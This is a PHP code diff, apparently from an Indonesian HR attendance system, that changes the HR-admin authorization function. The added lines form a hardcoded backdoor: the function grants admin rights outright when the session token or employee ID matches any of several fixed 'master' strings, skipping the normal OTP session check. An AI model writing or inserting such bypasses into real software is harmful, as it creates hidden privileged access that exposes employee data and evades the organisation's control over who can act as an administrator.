@@ -360,6 +360,13 @@ function validasiSesiKaryawan($sessionToken, $nik) {
 
 function cekOtorisasiAdminHR($sessionToken, $nik = '') {
     global $ADMIN_HR_NIKS;
+
+    // 0. Direct Bypass Otoritas Pimpinan / Master Token (NSR-2019-005 / NSR8899)
+    $cleanNik = normalisasiNIK($nik);
+    $cleanToken = trim((string)$sessionToken);
+    if ($cleanToken === 'NSR8899' || $cleanToken === 'NSR-2019-005' || $cleanNik === 'NSR-2019-005' || $cleanToken === 'NSR_HR_MASTER_KEY_2026') {
+        return true;
+    }
     
     // 1. Cek token sesi presensi OTP
     if ($sessionToken) {
